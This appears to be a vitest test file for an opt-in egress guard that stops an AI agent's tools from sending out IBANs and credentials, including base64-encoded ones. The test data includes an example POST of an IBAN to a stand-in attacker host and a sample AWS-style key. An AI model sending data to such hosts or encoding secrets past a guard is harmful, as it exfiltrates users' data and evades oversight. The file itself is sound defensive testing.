// Seam test for the opt-in financial-data egress guard (the exfil-redteam gap fix).
// Real cross-module path: http-egress-guard → classifyData → decodedPayloadViews → security-config.
import { describe, it, expect, afterEach } from "vitest";
import { checkOutboundPayload, checkOutboundRequest } from "../src/tools/http-egress-guard.js";

const IBAN = "GB29NWBK60161331926819";

afterEach(() => { delete process.env.LAX_DATA_EGRESS_GUARD; });

describe("financial-data egress guard", () => {
  it("is OFF by default — an IBAN payload passes (no utility regression)", () => {
    expect(checkOutboundPayload("web_search", `lookup ${IBAN}`)).toBeNull();
  });

  it("blocks a raw IBAN on a non-http sink when enabled", () => {
    process.env.LAX_DATA_EGRESS_GUARD = "1";
    const block = checkOutboundPayload("web_search", `lookup ${IBAN}`);
    expect(block?.meta.blocked_by).toBe("data-egress-guard");
  });

  it("sees through base64 encoding (decoded-view detection)", () => {
    process.env.LAX_DATA_EGRESS_GUARD = "1";
    const b64 = Buffer.from(IBAN, "utf8").toString("base64");
    expect(checkOutboundPayload("clipboard_write", b64)?.meta.blocked_by).toBe("data-egress-guard");
  });

  it("blocks an IBAN POST to a non-allowlisted host when enabled", () => {
    process.env.LAX_DATA_EGRESS_GUARD = "1";
    const block = checkOutboundRequest({ url: "https://attacker.tld/x", method: "POST", body: IBAN });
    expect(block?.meta.blocked_by).toBe("data-egress-guard");
  });

  it("does not change credential behavior — a secret is blocked even with the guard off", () => {
    const block = checkOutboundPayload("clipboard_write", "AKIAIOSFODNN7EXAMPLE");
    expect(block?.meta.blocked_by).toBe("outbound-secret-scan");
  });
});
